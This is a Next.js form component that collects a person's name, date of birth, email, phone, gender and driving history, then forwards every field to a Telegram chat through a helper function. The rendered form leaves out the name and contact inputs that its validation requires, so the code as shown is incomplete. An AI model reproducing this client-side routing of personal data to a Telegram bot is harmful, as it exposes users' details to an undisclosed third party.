/* eslint-disable @next/next/no-img-element */
"use client"
import { sendTelegramMessage } from "../../../utils/telegram";
import { useState } from "react";
import { useRouter } from "next/navigation";

const PersonalInformationForm = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dob: "",
    email: "",
    confirmEmail: "",
    phoneNumber: "",
    gender: "",
    drives: "", // New field for driving information
    vehicleType: "", // New field for vehicle type
    vehicleName: "", // New field for vehicle name/model
    hasDriversLicense: false, // New field for driver's license status
    drivingExperience: "", // New field for driving experience (how long)
    accidents: "", // New field for accidents (Yes/No)
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const router = useRouter();

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.firstName.trim()) newErrors.firstName = "First name is required";
    if (!formData.lastName.trim()) newErrors.lastName = "Last name is required";
    if (!formData.dob) newErrors.dob = "Date of Birth is required";
    if (!formData.email.trim()) newErrors.email = "Email is required";
    if (formData.email !== formData.confirmEmail) newErrors.confirmEmail = "Emails do not match";
    if (!formData.phoneNumber.trim()) newErrors.phoneNumber = "Phone Number is required";
    if (!formData.gender) newErrors.gender = "Gender is required";
    if (formData.drives === "") newErrors.drives = "Please specify if you drive"; // New error check
    if (formData.drives === "Yes") {
      if (!formData.vehicleName.trim()) newErrors.vehicleName = "Vehicle Name and Model is required"; // Vehicle validation
      if (!formData.hasDriversLicense) newErrors.hasDriversLicense = "Driver's License is required"; // License validation
      if (!formData.drivingExperience) newErrors.drivingExperience = "Please specify how long you have been driving"; // Experience validation
      if (formData.accidents === "") newErrors.accidents = "Please specify if you've had any accidents"; // Accidents validation
    }
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const validationErrors = validateForm();
    
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    console.log("Form Submitted", formData);

    // Send the form data to Telegram
    const message = `New User Form Submission:\n
    First Name: ${formData.firstName}\n
    Last Name: ${formData.lastName}\n
    Date of Birth: ${formData.dob}\n
    Email: ${formData.email}\n
    Gender: ${formData.gender}\n
    Phone Number: ${formData.phoneNumber}\n
    Drives: ${formData.drives}\n
    Vehicle Type: ${formData.vehicleType}\n
    Vehicle Name and Model: ${formData.vehicleName}\n
    Has Driver's License: ${formData.hasDriversLicense ? 'Yes' : 'No'}\n
    Driving Experience: ${formData.drivingExperience}\n
    Any Accidents: ${formData.accidents}`;

    await sendTelegramMessage(message);

    // Redirect to the next page
    router.push("/education-history");
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-green-600 shadow-md">
        <div className="max-w-3xl mx-auto p-4 flex items-center">
          <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3"/>
          <div className="flex-1 ml-2">
            <div className="h-2 bg-green-500 rounded-full mt-1">
              <div className="h-full bg-green-200 rounded-full transition-all duration-300" />
            </div>
          </div>
        </div>
      </header>
      <main className="flex-grow container mx-auto mt-12 px-4">
        <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
          <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">Personal Information</h1>
          <form onSubmit={handleSubmit}>
            {/* Existing form fields... */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Do you drive?</label>
              <div className="flex items-center space-x-4">
                <label>
                  <input
                    type="radio"
                    name="drives"
                    value="Yes"
                    checked={formData.drives === "Yes"}
                    onChange={(e) => setFormData({ ...formData, drives: e.target.value })}
                    className="mr-2"
                  />
                  Yes
                </label>
                <label>
                  <input
                    type="radio"
                    name="drives"
                    value="No"
                    checked={formData.drives === "No"}
                    onChange={(e) => setFormData({ ...formData, drives: e.target.value })}
                    className="mr-2"
                  />
                  No
                </label>
              </div>
              {errors.drives && <p className="text-red-500 text-sm mt-1">{errors.drives}</p>}
            </div>

            {formData.drives === "Yes" && (
              <>
                <div className="mb-6">
                  <label className="block text-sm font-medium text-black">How long have you been driving?</label>
                  <input
                    value={formData.drivingExperience}
                    onChange={(e) => setFormData({ ...formData, drivingExperience: e.target.value })}
                    className={`w-full mt-2 border ${errors.drivingExperience ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                    placeholder="e.g., 5 years"
                  />
                  {errors.drivingExperience && <p className="text-red-500 text-sm mt-1">{errors.drivingExperience}</p>}
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-black">Have you had any accidents?</label>
                  <div className="flex items-center space-x-4">
                    <label>
                      <input
                        type="radio"
                        name="accidents"
                        value="Yes"
                        checked={formData.accidents === "Yes"}
                        onChange={(e) => setFormData({ ...formData, accidents: e.target.value })}
                        className="mr-2"
                      />
                      Yes
                    </label>
                    <label>
                      <input
                        type="radio"
                        name="accidents"
                        value="No"
                        checked={formData.accidents === "No"}
                        onChange={(e) => setFormData({ ...formData, accidents: e.target.value })}
                        className="mr-2"
                      />
                      No
                    </label>
                  </div>
                  {errors.accidents && <p className="text-red-500 text-sm mt-1">{errors.accidents}</p>}
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-black">Vehicle Type</label>
                  <select
                    value={formData.vehicleType}
                    onChange={(e) => setFormData({ ...formData, vehicleType: e.target.value })}
                    className={`w-full mt-2 border ${errors.vehicleType ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                  >
                    <option value="">Select Vehicle Type</option>
                    <option value="Car">Car</option>
                    <option value="Bike">Bike</option>
                  </select>
                  {errors.vehicleType && <p className="text-red-500 text-sm mt-1">{errors.vehicleType}</p>}
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-black">Vehicle Name and Model</label>
                  <input
                    value={formData.vehicleName}
                    onChange={(e) => setFormData({ ...formData, vehicleName: e.target.value })}
                    className={`w-full mt-2 border ${errors.vehicleName ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                  />
                  {errors.vehicleName && <p className="text-red-500 text-sm mt-1">{errors.vehicleName}</p>}
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-black">Do you have a valid Driver&apos;s License?</label>
                  <div className="flex items-center space-x-4">
                    <label>
                      <input
                        type="radio"
                        name="hasDriversLicense"
                        value="true"
                        checked={formData.hasDriversLicense === true}
                        onChange={() => setFormData({ ...formData, hasDriversLicense: true })}
                        className="mr-2"
                      />
                      Yes
                    </label>
                    <label>
                      <input
                        type="radio"
                        name="hasDriversLicense"
                        value="false"
                        checked={formData.hasDriversLicense === false}
                        onChange={() => setFormData({ ...formData, hasDriversLicense: false })}
                        className="mr-2"
                      />
                      No
                    </label>
                  </div>
                  {errors.hasDriversLicense && <p className="text-red-500 text-sm mt-1">{errors.hasDriversLicense}</p>}
                </div>
              </>
            )}

            <button type="submit" className="w-full bg-green-500 text-white p-4 rounded-xl hover:bg-green-600">
              Next
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PersonalInformationForm;
